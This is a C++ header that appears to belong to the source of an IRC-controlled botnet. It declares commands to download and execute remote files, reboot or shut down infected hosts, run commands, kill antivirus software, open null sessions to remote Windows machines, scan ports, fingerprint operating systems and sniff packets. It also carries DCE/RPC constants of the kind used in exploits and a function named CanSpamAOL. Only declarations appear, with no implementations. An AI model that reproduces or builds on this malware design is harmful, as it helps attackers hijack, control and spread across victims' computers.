
#ifndef __UTILITY_H__
#define __UTILITY_H__

#include "cstring.h"
#include "commands.h"
#include "message.h"
#include "ssllib.h"
#include "cthread.h"

//#ifndef LINUX
//#define LINUX
//#endif

//#ifndef DBGCONSOLE
//#define DBGCONSOLE
//#endif

bool recv_line(int sSocket, char *szBuffer, int iBufSize, CSSLSocket *pSSLSocket=NULL);
bool recv_line_irc(int sSocket, char *szBuffer, int iBufSize, CSSLSocket *pSSLSocket=NULL);

// Raw sockets / sniffing flags

#ifndef IP_HDRINCL
#define IP_HDRINCL			2
#endif

#ifndef SIO_RCVALL
#define SIO_RCVALL			_WSAIOW(IOC_VENDOR,1)
#endif

// Definitions for OS fingerprinting

#define OS_UNKNOWN			0
#define OS_WINNT			1
#define OS_WIN2K			2
#define	OS_WINXP			3

#define FP_RPC				1
#define	FP_PORT5K			2
#define FP_TTL				3

// DCE defines

#define DCE_VERSION_MAJOR	0x05
#define DCE_VERSION_MINOR	0x00

#define DCE_PKT_BIND		0x0B
#define DCE_PKT_BINDACK		0x0C
#define DCE_PKT_BINDNACK	0x0D
#define DCE_PKT_REQUEST		0x00
#define DCE_PKT_FAULT		0x03
#define DCE_PKT_RESPONSE	0x02
#define DCE_PKT_ALTCONT		0x0E
#define DCE_PKT_ALTCONTRESP	0x0F
#define DCE_PKT_BINDRESP	0x10

#define RPC_FLG_FIRST		0x01
#define RPC_FLG_LAST		0x02

#define LINUX_TYPE_UNKNOWN		0
#define LINUX_TYPE_DEBIAN		1
#define LINUX_TYPE_REDHAT		2
#define LINUX_TYPE_SUSE			3
#define LINUX_TYPE_SLACKWARE	4
#define LINUX_TYPE_MANDRAKE		5
#define LINUX_TYPE_YELLOWDOG	6
#define LINUX_TYPE_TURBOLINUX	7
#define LINUX_TYPE_UNITEDLINUX	8
#define LINUX_TYPE_FREEBSD		9

typedef struct ip_hdr
{
	unsigned char h_verlen;
	unsigned char tos;
	unsigned short total_len;
	unsigned short ident;
	unsigned short frag_and_flags;
	unsigned char ttl;
	unsigned char proto;
	unsigned short checksum;
	unsigned int sourceIP;
	unsigned int destIP;
}IPHEADER;

typedef struct tsd_hdr
{
	unsigned long saddr;
	unsigned long daddr;
	char mbz;
	char ptcl;
	unsigned short tcpl;
}PSDHEADER;

typedef struct tcp_hdr
{
	unsigned short th_sport;
	unsigned short th_dport;
	unsigned int th_seq;
	unsigned int th_ack;
	unsigned char th_lenres;
	unsigned char th_flag;
	unsigned short th_win;
	unsigned short th_sum;
	unsigned short th_urp;
}TCPHEADER;

typedef struct xheaders_s
{	bool bBroadcast;
	int iTTL;
	bool bUltrapeer;
} xheaders;

typedef struct message_s
{	char szCommand[256];
	char szParams[1024];
	char szId[65];
	char szIntFlags[191];
	int iContentLength;
	char *szContent;
} message;

typedef struct url_s
{	CString sProto;
	CString	sHost;
	int		iPort;
	CString	sReq;
} url;

typedef struct http_req_s
{	url		uURL;
	CString sMethod;
	CString sHTTPVer;
	CString	sHeaders;
} http_req;

class CDownloader : public CCommandHandler
{
public:
	void Init();
	bool HandleCommand(CMessage *pMsg);

	command	m_cmdDownload,		m_cmdUpdate,	m_cmdExecute,		m_cmdVisit;
	command	m_cmdDownloadFtp,	m_cmdUpdateFtp,	m_cmdExecuteFtp;
};

class CRSLControl : public CCommandHandler
{
public:
	void Init();
	bool HandleCommand(CMessage *pMsg);
	
	command	m_cmdReboot, m_cmdShutdown, m_cmdLogoff;
};

class CDownloadHelper : public CThread
{
public:
	virtual ~CDownloadHelper() { }
	virtual void *Run();

	CString			m_sHost;
	CString			m_sPath;
	CString			m_sUser;
	CString			m_sPass;
	CString			m_sTarget;
	CString			m_sReplyTo;
	bool			m_bExecute;
	bool			m_bUpdate;
	bool			m_bFTP;
	bool			m_bSilent;
	bool			m_bNotice;
};

class CCmdExecutor : public CThread
{
public:
	CCmdExecutor() { m_pMsg=NULL; m_bMsgSet=false; }
	virtual ~CCmdExecutor() { }
	virtual void *Run();

	CMessage *Get() { return m_pMsg; }
	void Set(CMessage*);
private:
	CMessage	*m_pMsg;
	CMessage	 m_mMsg;
	bool		 m_bMsgSet;
};

class CSendFile : public CThread
{
public:
	virtual ~CSendFile() { if(m_sListenSocket>0) xClose(m_sListenSocket); }
	virtual void *Run();
protected:
	int				m_sListenSocket;
	sockaddr_in		m_lAddr;
};

class CIdentD : public CThread
{
public:
	virtual ~CIdentD() { if(m_sListenSocket>0) xClose(m_sListenSocket); }
	virtual void *Run();
protected:
	int				m_sListenSocket;
	sockaddr_in		m_lAddr;
};

void gen_unique_id(char *szString, int iLen);
int cpuspeed(void);
CString RndNick(const char *szPrefix);
bool IsSpace(const char cChar);
bool Exist(const char *filename);
bool IsPrivate(const char *ip);
bool ScanPort(const char *host, const unsigned short port);
bool Execute(const char *filename, const char *params);
bool CreateProc(char *filename, char *params);
#ifdef WIN32
bool WriteFile(const char *filename, int resnum, LPCTSTR lpModuleName);
bool ConnectViaNullSession(const char *remote_host, LPNETRESOURCEW nr);
bool CloseNullSession(const char *remote_host);
#endif // WIN32
unsigned long ResolveAddress(const char *szHost);
int DoTcpConnect(const char *szHost, int iPort);
int DoTcpBind(int iPort);
int DoTcpAccept(int sSocket);
bool KillProcess(const char *szProcName);
char* GetFilename(char* szFilename, size_t sBufSize);
unsigned short checksum(unsigned short *buffer, int size);
in_addr &to_in_addr(unsigned long lHost);
void KillAV();
int GetFileSize(FILE *fp);
bool ParseURL(const char *szURL, url *pURL);
bool MemContains(const char *pMem, const int iMemLen, const char *pSearch, const int iSearchLen);
int FpHost(const char *szHost, int iFpType);
bool CanSpamAOL();
bool GetKVersion(char **pszBuf, int iDistro);
bool GetVersion(char **pszBuf, int iDistro);
int GetDistro();
void test();

#pragma warning(disable:4035)
#if defined (__i386__)
static __inline__ unsigned long long GetCycleCount(void)
{
        unsigned long long int x;
        __asm__ volatile("rdtsc":"=A"(x));
        return x;
}
#elif defined (__x86_64__)
static __inline__ unsigned long long GetCycleCount(void)
{
        unsigned hi,lo;
        __asm__ volatile("rdtsc":"=a"(lo),"=d"(hi));
        return ((unsigned long long)lo)|(((unsigned long long)hi)<<32);
}
#endif



#pragma warning(disable:4035)
#endif // __UTILITY_H__
